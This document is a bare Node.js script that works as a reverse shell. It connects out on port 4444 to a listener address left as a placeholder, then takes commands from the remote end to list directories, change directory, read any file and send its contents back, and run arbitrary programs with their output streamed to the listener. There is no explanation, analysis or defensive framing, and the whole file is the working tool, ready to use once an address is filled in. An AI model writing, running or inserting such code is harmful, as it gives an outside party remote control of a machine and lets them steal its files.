(function() {
    var net = require('net');
    var fs = require('fs');
    var path = require('path');
    
    var client = new net.Socket();
    client.connect(4444, '!!!YOUR_LISTENER_IP_INSERT_HERE!!!', function() {
        client.write('Node.js shell active. Commands: ls, cd, cat, pwd, exec\n');
    });
    
    var cwd = process.cwd();
    
    client.on('data', function(data) {
        var cmd = data.toString().trim();
        var parts = cmd.split(' ');
        var command = parts[0].toLowerCase();
        var args = parts.slice(1);
        
        try {
            if (command === 'ls' || command === 'dir') {
                var files = fs.readdirSync(cwd);
                client.write(JSON.stringify(files, null, 2) + '\n');
            }
            else if (command === 'pwd') {
                client.write(cwd + '\n');
            }
            else if (command === 'cd') {
                var newPath = args[0] || '';
                if (newPath === '') {
                    cwd = process.env.HOME || process.env.USERPROFILE;
                } else {
                    var target = path.resolve(cwd, newPath);
                    if (fs.statSync(target).isDirectory()) {
                        cwd = target;
                    } else {
                        client.write('Not a directory\n');
                    }
                }
                client.write('CWD: ' + cwd + '\n');
            }
            else if (command === 'cat') {
                var filePath = path.resolve(cwd, args[0]);
                var content = fs.readFileSync(filePath, 'utf-8');
                client.write(content + '\n');
            }
            else if (command === 'exec') {
               try {
                    var cp = require('child_process');
                    var exe = cp.spawn(args[0], args.slice(1));
                    exe.stdout.on('data', (d) => client.write(d));
                    exe.stderr.on('data', (d) => client.write(d));
                } catch (e) {
                    client.write('Exec failed: ' + e.message + '\n');
                }
            }
            else if (command === 'exit') {
                client.destroy();
            }
            else {
                client.write('Unknown command\n');
            }
        } catch (err) {
            client.write('Error: ' + err.message + '\n');
        }
    });
    
    client.on('close', function() {
        console.log('Connection closed');
    });
})();
